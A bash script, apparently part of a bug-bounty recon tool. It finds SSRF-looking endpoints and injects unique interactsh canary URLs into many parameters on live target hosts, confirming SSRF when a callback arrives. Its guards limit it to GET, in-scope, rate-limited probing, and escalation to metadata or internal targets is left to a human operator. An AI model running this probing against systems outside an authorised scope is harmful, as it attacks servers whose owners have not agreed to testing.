#!/usr/bin/env bash
# =============================================================================
# recon_ssrf_oob.sh — U4 lane: UNAUTHENTICATED SSRF discovery, OOB-confirmed.
#
# The crown unauth class (docs/knowledge/class-unauth-hunting.md play U4). Mines the
# jsintel feedstock for SSRF-sink routes, injects a UNIQUE interactsh canary per sink via
# the vetted recon_safe_probe.sh (GET only, in-scope+pays+vpn+rate-limit), then polls
# interactsh: a callback to a canary we planted = the server made the request = CONFIRMED
# SSRF (the definitive primitive — timing/error alone is only a LEAD). Each canary is
# unique per (host,endpoint) so a callback maps to exactly one sink => near-zero FP.
#
# Confirmed -> state.py record-confirmed (signal_class=ssrf-oob) -> ai-pending -> 2IC verify
# -> DIG (the operator escalates to metadata/internal/RCE — NEVER autonomous).
#
# HARD LINE: the canary is OUR public interactsh domain; we NEVER point a sink at
# 169.254/internal/file:// and NEVER escalate. Proof = "the server fetched our benign
# canary unauthenticated", nothing more. GET only, in-scope only, Mullvad-only, rate-limited.
# Target-facing -> run via run_scanner (reconrun) from the daemon.
# =============================================================================
set -uo pipefail
IFS=$'\n\t'
log()  { printf '[%s SSRF-OOB] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }
warn() { printf '[%s SSRF-OOB WARN] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
BASE_DIR="${BASE_DIR:-$HOME/recon}"
STATE_DIR="${STATE_DIR:-$BASE_DIR/state}"
V3_DB="${V3_DB:-$BASE_DIR/v3/findings.db}"
EP_STORE="${EP_STORE:-$BASE_DIR/js_recon/endpoints.jsonl}"
SAFE_PROBE="${SAFE_PROBE:-$SCRIPT_DIR/recon_safe_probe.sh}"
STATE_PY="${STATE_PY:-$REPO_DIR/engine/state.py}"
SEEN="${SEEN:-$STATE_DIR/ssrf_oob_seen.tsv}"
ICLIENT="${ICLIENT:-$(command -v interactsh-client 2>/dev/null || echo '')}"
BATCH="${SSRF_OOB_BATCH:-20}"                  # sinks injected per cycle
OOB_WAIT="${SSRF_OOB_WAIT:-60}"                # seconds to wait for callbacks (interactsh polls every 5s)
COOLDOWN_SECS="${SSRF_OOB_COOLDOWN:-1209600}"  # 14d per (host,endpoint)
SCORE="${SSRF_OOB_SCORE:-8}"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/ssrfoob.XXXXXX")"
OOB_LOG="$TMP/oob.jsonl"; PAYLOADS="$TMP/payloads.txt"; ICLIENT_OUT="$TMP/iclient.out"
ICLIENT_PID=""
cleanup() { [[ -n "$ICLIENT_PID" ]] && kill "$ICLIENT_PID" 2>/dev/null; rm -rf "$TMP" 2>/dev/null; }
trap cleanup EXIT

mkdir -p "$STATE_DIR" "$(dirname "$V3_DB")" 2>/dev/null || true
exec 9>"$STATE_DIR/ssrf_oob.lock"; flock -n 9 || { warn "already running"; exit 0; }
[[ -f "$STATE_DIR/vpn_down" ]] && { warn "vpn_down — skipping (fail-closed)"; exit 0; }
command -v jq >/dev/null 2>&1      || { warn "jq missing"; exit 0; }
command -v python3 >/dev/null 2>&1 || { warn "python3 missing"; exit 0; }
[[ -n "$ICLIENT"    ]] || { warn "interactsh-client missing"; exit 0; }
[[ -f "$EP_STORE"   ]] || { warn "no endpoint feedstock ($EP_STORE)"; exit 0; }
[[ -f "$SAFE_PROBE" ]] || { warn "safe probe missing"; exit 0; }

now_epoch() { date -u +%s; }
NOW="$(now_epoch)"
if [[ -f "$SEEN" ]]; then
  awk -F'\t' -v cut="$((NOW - COOLDOWN_SECS))" 'NF>=3 && ($3+0)>=cut' "$SEEN" > "$SEEN.tmp" 2>/dev/null && mv "$SEEN.tmp" "$SEEN" 2>/dev/null || true
fi
seen_recent() { [[ -f "$SEEN" ]] && awk -F'\t' -v h="$1" -v e="$2" -v cut="$((NOW - COOLDOWN_SECS))" 'NF>=3 && $1==h && $2==e && ($3+0)>=cut{f=1} END{exit f?0:1}' "$SEEN"; }
mark_seen() { printf '%s\t%s\t%s\n' "$1" "$2" "$(now_epoch)" >> "$SEEN" 2>/dev/null || true; }

# ---- candidate selection: SSRF-sink-shaped routes from the jsintel feedstock --
SINK_RE='(fetch|proxy|import|preview|webhook|render|/pdf|thumbnail|screenshot|image-?proxy|/avatar|redirect|/load|/feed|callback|/url|outbound|remote|/get\?|crawl|parse-?url|link-?preview|oembed|/api/.*(fetch|proxy|import|load|render|preview|image|webhook|url))'
mapfile -t POOL < <(
  jq -rc --arg re "$SINK_RE" '
    select((.host // "") != "" and (.endpoint // "") != "")
    | select((.endpoint|tostring) | startswith("/"))
    | select((.endpoint|tostring) | test($re; "i"))
    | [ .host, (.endpoint|tostring), (.program // "") ] | @tsv' "$EP_STORE" 2>/dev/null \
  | sort -u | shuf 2>/dev/null
)
# filter out cooled-down (host,endpoint) then cap to BATCH
CANDS=()
for line in "${POOL[@]}"; do
  IFS=$'\t' read -r h e p <<<"$line"
  [[ -n "$h" && -n "$e" ]] || continue
  seen_recent "$h" "$e" && continue
  CANDS+=("$line")
  [[ "${#CANDS[@]}" -ge "$BATCH" ]] && break
done
N="${#CANDS[@]}"
[[ "$N" -gt 0 ]] || { log "no fresh SSRF-sink candidates"; exit 0; }

# ---- start interactsh, capture N unique payload domains ----------------------
"$ICLIENT" -n "$N" -json -o "$OOB_LOG" -ps -psf "$PAYLOADS" -pi 5 >"$ICLIENT_OUT" 2>&1 &
ICLIENT_PID=$!
for _ in $(seq 1 15); do [[ -s "$PAYLOADS" ]] && break; sleep 1; done
mapfile -t PAY < <(grep -aoE '[a-z0-9]+\.(oast\.(pro|live|site|online|fun|me)|interact\.sh)' "$PAYLOADS" 2>/dev/null | head -n "$N")
[[ "${#PAY[@]}" -gt 0 ]] || { warn "interactsh registered no payloads (server unreachable?)"; exit 0; }
M="${#PAY[@]}"; [[ "$M" -lt "$N" ]] && N="$M"
log "interactsh up · $N unique canaries · injecting…"

# ---- inject one unique canary per candidate via the vetted safe probe --------
declare -a MAP_HOST MAP_EP MAP_PROG MAP_URL
injected=0
for ((i=0; i<N; i++)); do
  IFS=$'\t' read -r host endpoint program <<<"${CANDS[$i]}"
  payload="${PAY[$i]}"
  enc="http%3A%2F%2F${payload}%2F"           # url-encoded benign canary (our OOB)
  sep="?"; [[ "$endpoint" == *"?"* ]] && sep="&"
  url="https://${host}${endpoint}${sep}url=${enc}&uri=${enc}&dest=${enc}&u=${enc}&redirect=${enc}&next=${enc}&link=${enc}&proxy=${enc}&target=${enc}&callback=${enc}&image=${enc}&feed=${enc}&fetch=${enc}&remote=${enc}"
  MAP_HOST[$i]="$host"; MAP_EP[$i]="$endpoint"; MAP_PROG[$i]="$program"; MAP_URL[$i]="$url"
  out="$(bash "$SAFE_PROBE" "$url" GET 2>/dev/null)"
  mark_seen "$host" "$endpoint"
  err="$(printf '%s' "$out" | jq -r '.error // ""' 2>/dev/null)"
  case "$err" in
    *global-probe-pause*) log "global probe pause — stop injecting (planted $injected)"; break ;;
    *) injected=$((injected+1)) ;;
  esac
done
log "injected $injected canaries · waiting ${OOB_WAIT}s for callbacks…"
sleep "$OOB_WAIT"

# ---- harvest: a callback to canary[i] => sink[i] is SSRF (server fetched it) --
confirmed=0
for ((i=0; i<N; i++)); do
  payload="${PAY[$i]}"
  hit="$(grep -aF "$payload" "$OOB_LOG" 2>/dev/null | head -1)"
  [[ -n "$hit" ]] || continue
  proto="$(printf '%s' "$hit" | jq -r '.protocol // "?"' 2>/dev/null || echo '?')"
  remote="$(printf '%s' "$hit" | jq -r '."remote-address" // .remote_address // "?"' 2>/dev/null || echo '?')"
  host="${MAP_HOST[$i]}"; url="${MAP_URL[$i]}"; program="${MAP_PROG[$i]}"
  ev="$(jq -nc --arg u "$url" --arg c "$payload" --arg pr "$proto" --arg rip "$remote" \
        '{sink_url:$u, canary:$c, callback_protocol:$pr, callback_remote_ip:$rip,
          reason:("OOB \($pr) callback to a unique canary planted only in this sink = server-side request forgery (blind, confirmed). Escalate (operator): metadata/internal — DIG.")}' 2>/dev/null)"
  V3_DB="$V3_DB" python3 "$STATE_PY" record-confirmed \
    "$host" "$url" "$program" "ssrf-oob" "ssrf" "$SCORE" "0.9" "$ev" >/dev/null 2>&1 \
    && { confirmed=$((confirmed+1)); log "CONFIRMED SSRF ($proto) on $host via planted canary"; }
done

log "cycle done · candidates=$N injected=$injected CONFIRMED=$confirmed"
exit 0
